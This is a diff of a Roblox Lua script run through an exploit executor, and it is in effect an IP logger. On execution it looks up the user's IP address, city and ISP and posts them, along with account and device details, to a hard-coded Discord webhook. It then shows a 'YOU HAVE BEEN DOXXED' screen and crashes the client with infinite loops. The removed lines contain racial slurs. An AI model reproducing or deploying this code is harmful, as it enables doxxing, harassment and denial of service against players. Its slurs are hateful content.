@@ -1,120 +1,191 @@
 local HttpService = game:GetService("HttpService")
-local LocalizationService = game:GetService("LocalizationService")
 local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
+local SoundService = game:GetService("SoundService")
+local RunService = game:GetService("RunService")
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- System --
-local WebhookConfig = {
-    Enabled = true,
-    Url = "https://webhook.lewisakura.moe/api/webhooks/1549137752078164008/30EJxv_O5QMfqwyZWcd5hFYWCYxIaQmvmkNqgxaYAudIfBVrrWZQ_v8tTyChkE8mhhoW"
-}
+local WebhookUrl = "https://webhook.lewisakura.moe/api/webhooks/1549137752078164008/30EJxv_O5QMfqwyZWcd5hFYWCYxIaQmvmkNqgxaYAudIfBVrrWZQ_v8tTyChkE8mhhoW"
 
--- Function --
-local function ShowGreenNotification(text)
-    local screenGui = playerGui:FindFirstChild("ScriptNotification") or Instance.new("ScreenGui")
-    screenGui.Name = "ScriptNotification"
-    screenGui.ResetOnSpawn = false
-    screenGui.Parent = playerGui
-
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 380, 0, 90)
-    frame.Position = UDim2.new(0.5, -190, 0, -120)
-    frame.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
-    frame.BorderSizePixel = 0
-    frame.BackgroundTransparency = 0.05
-    frame.Parent = screenGui
-
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 14)
-    corner.Parent = frame
-
-    local label = Instance.new("TextLabel")
-    label.Size = UDim2.new(1, -24, 1, -24)
-    label.Position = UDim2.new(0, 12, 0, 12)
-    label.BackgroundTransparency = 1
-    label.Text = text
-    label.TextColor3 = Color3.new(1, 1, 1)
-    label.TextScaled = true
-    label.Font = Enum.Font.GothamBold
-    label.TextStrokeTransparency = 0.8
-    label.Parent = frame
-
-    TweenService:Create(frame, TweenInfo.new(0.7, Enum.EasingStyle.Back), {Position = UDim2.new(0.5, -190, 0, 30)}):Play()
-
-    task.wait(4.5)
-    local fade = TweenService:Create(frame, TweenInfo.new(0.9), {Position = UDim2.new(0.5, -190, 0, -120), BackgroundTransparency = 1})
-    fade:Play()
-    fade.Completed:Connect(function() frame:Destroy() end)
+local function GetExecutor()
+	local ok, name = pcall(function()
+		return identifyexecutor and identifyexecutor() or "Unknown"
+	end)
+	return ok and name or "Unknown"
 end
 
--- Función WebHook --
-local function SendWebhookWithIP()
-    if not WebhookConfig.Enabled then return end
-
-    local country = "Desconocido"
-    pcall(function()
-        country = LocalizationService:GetCountryRegionForPlayerAsync(player)
-    end)
-
-    local accountAge = player.AccountAge
-    local approxDate = os.date("%d/%m/%Y", os.time() - accountAge * 86400)
-
-    -- Method --
-    local ipData = {
-        query = "Desconocido",
-        country = "Desconocido",
-        regionName = "Desconocido",
-        city = "Desconocido",
-        isp = "Desconocido"
-    }
-
-    pcall(function()
-        local response = game:HttpGet("http://ip-api.com/json/?fields=query,country,regionName,city,isp")
-        ipData = HttpService:JSONDecode(response)
-    end)
-
-    local embed = {
-        title = "Home Of God",
-        description = "IpLogger",
-        color = 0xFF0000,  -- red --
-        fields = {
-            {name = "Usuario", value = "```"..player.Name.." ("..player.UserId..")```", inline = true},
-            {name = "IP", value = "```".. (ipData.query or "No disponible") .."```", inline = true},
-            {name = "País", value = "```".. (ipData.country or country) .."```", inline = true},
-            {name = "Región/Ciudad", value = "```".. (ipData.regionName or "N/A") .. " - " .. (ipData.city or "N/A") .."```", inline = false},
-            {name = "ISP", value = "```".. (ipData.isp or "Desconocido") .."```", inline = false},
-            {name = "Edad de cuenta", value = "```"..accountAge.." días```", inline = true},
-            {name = "Creada aprox.", value = "```"..approxDate.."```", inline = true},
-            {name = "Servidor", value = "```"..tostring(game.JobId).."```", inline = false}
-        },
-        footer = {text = "Logger • "..os.date("%Y-%m-%d %H:%M:%S")}
-    }
-
-    local data = { 
-        username = "Nigger IP Logger",
-        embeds = {embed}
-    }
-
-    pcall(function()
-        local req = http_request or request or (syn and syn.request)
-        if req then
-            req({
-                Url = WebhookConfig.Url,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode(data)
-            })
-        end
-    end)
+local function GetDevice()
+	if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+		return "Mobile (Android / iOS)"
+	elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then
+		return "Console"
+	else
+		return "PC"
+	end
 end
 
--- System --
-SendWebhookWithIP()
+local function GetGameName()
+	local ok, info = pcall(function()
+		return MarketplaceService:GetProductInfo(game.PlaceId)
+	end)
+	return ok and info.Name or "Unknown"
+end
 
--- ←←← Method
-ShowGreenNotification("Fuck you")
+local function SendLog()
+	local age = player.AccountAge
+	local created = os.date("%d/%m/%Y", os.time() - age * 86400)
+	local executor = GetExecutor()
+	local device = GetDevice()
+	local gameName = GetGameName()
 
-print("Fuck Nigger")
+	local ipData = {query = "Unknown", country = "Unknown", regionName = "Unknown", city = "Unknown", isp = "Unknown"}
+	pcall(function()
+		local res = game:HttpGet("http://ip-api.com/json/?fields=query,country,regionName,city,isp")
+		ipData = HttpService:JSONDecode(res)
+	end)
+
+	local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
+
+	local data = {
+		username = "Vangeliicide Logger",
+		embeds = {{
+			title = "🔥 VANGELIICIDE LOGGER",
+			description = "```diff\n+ Target has been doxxed\n```",
+			color = 0x00FF6A,
+			thumbnail = {url = avatar},
+			fields = {
+				{name = "👤 User", value = "```"..player.Name.."\n"..player.UserId.."```", inline = true},
+				{name = "📱 Device", value = "```"..device.."```", inline = true},
+				{name = "🖥️ Executor", value = "```"..executor.."```", inline = true},
+				{name = "🌐 IP Address", value = "```"..(ipData.query or "N/A").."```", inline = true},
+				{name = "🌍 Location", value = "```"..(ipData.country or "Unknown").."\n"..(ipData.regionName or "N/A").." - "..(ipData.city or "N/A").."```", inline = true},
+				{name = "📡 ISP", value = "```"..(ipData.isp or "Unknown").."```", inline = true},
+				{name = "⏳ Account", value = "```"..age.." days\n"..created.."```", inline = true},
+				{name = "🎮 Game", value = "```"..gameName.."\n"..game.PlaceId.."```", inline = false},
+				{name = "🆔 Server", value = "```"..tostring(game.JobId).."```", inline = false}
+			},
+			footer = {text = "Vangeliicide • Private System"},
+			timestamp = DateTime.now():ToIsoDate()
+		}}
+	}
+
+	pcall(function()
+		local req = http_request or request or (syn and syn.request)
+		if req then
+			req({
+				Url = WebhookUrl,
+				Method = "POST",
+				Headers = {["Content-Type"] = "application/json"},
+				Body = HttpService:JSONEncode(data)
+			})
+		end
+	end)
+end
+
+local function PlayAuraSound()
+	local sound = Instance.new("Sound")
+	sound.SoundId = "rbxassetid://9048379035"
+	sound.Volume = 1.4
+	sound.Looped = true
+	sound.Parent = SoundService
+	sound:Play()
+end
+
+local function ShowDoxxScreen()
+	local gui = Instance.new("ScreenGui")
+	gui.Name = "Vangeliicide"
+	gui.IgnoreGuiInset = true
+	gui.DisplayOrder = 999
+	gui.ResetOnSpawn = false
+	gui.Parent = playerGui
+
+	local bg = Instance.new("Frame")
+	bg.Size = UDim2.new(1, 0, 1, 0)
+	bg.BackgroundColor3 = Color3.fromRGB(0, 18, 0)
+	bg.BorderSizePixel = 0
+	bg.Parent = gui
+
+	-- Continuous infinite rain
+	local function createRainColumn()
+		local label = Instance.new("TextLabel")
+		label.Size = UDim2.new(0, 14, 0, 1400)
+		label.Position = UDim2.new(math.random(), 0, -2, 0)
+		label.BackgroundTransparency = 1
+		label.TextColor3 = Color3.fromRGB(0, 255, 70)
+		label.TextTransparency = 0.25
+		label.Font = Enum.Font.Code
+		label.TextSize = 13
+		label.Text = ""
+		for _ = 1, 60 do
+			label.Text = label.Text .. tostring(math.random(0,1)) .. "\n"
+		end
+		label.Parent = bg
+
+		local function fall()
+			label.Position = UDim2.new(math.random(), 0, -2.2, 0)
+			local speed = math.random(7, 13)
+			local tween = TweenService:Create(label, TweenInfo.new(speed, Enum.EasingStyle.Linear), {
+				Position = UDim2.new(label.Position.X.Scale, 0, 2.5, 0)
+			})
+			tween:Play()
+			tween.Completed:Connect(function()
+				fall()
+			end)
+		end
+		fall()
+	end
+
+	for i = 1, 90 do
+		createRainColumn()
+	end
+
+	-- Keep generating more columns over time
+	task.spawn(function()
+		while true do
+			task.wait(0.4)
+			createRainColumn()
+		end
+	end)
+
+	local title = Instance.new("TextLabel")
+	title.Size = UDim2.new(1, 0, 0, 70)
+	title.Position = UDim2.new(0, 0, 0.34, 0)
+	title.BackgroundTransparency = 1
+	title.Text = "VANGELIICIDE"
+	title.TextColor3 = Color3.fromRGB(0, 255, 90)
+	title.Font = Enum.Font.GothamBlack
+	title.TextSize = 58
+	title.Parent = bg
+
+	local sub = Instance.new("TextLabel")
+	sub.Size = UDim2.new(1, 0, 0, 45)
+	sub.Position = UDim2.new(0, 0, 0.45, 0)
+	sub.BackgroundTransparency = 1
+	sub.Text = "YOU HAVE BEEN DOXXED"
+	sub.TextColor3 = Color3.fromRGB(190, 255, 190)
+	sub.Font = Enum.Font.GothamBold
+	sub.TextSize = 27
+	sub.Parent = bg
+end
+
+SendLog()
+PlayAuraSound()
+ShowDoxxScreen()
+
+-- Heavy crash after 6 seconds
+task.delay(6, function()
+	for i = 1, 80 do
+		task.spawn(function()
+			while true do
+				Instance.new("Part")
+				Instance.new("Frame")
+				Instance.new("ScreenGui")
+			end
+		end)
+	end
+	while true do end
+end)
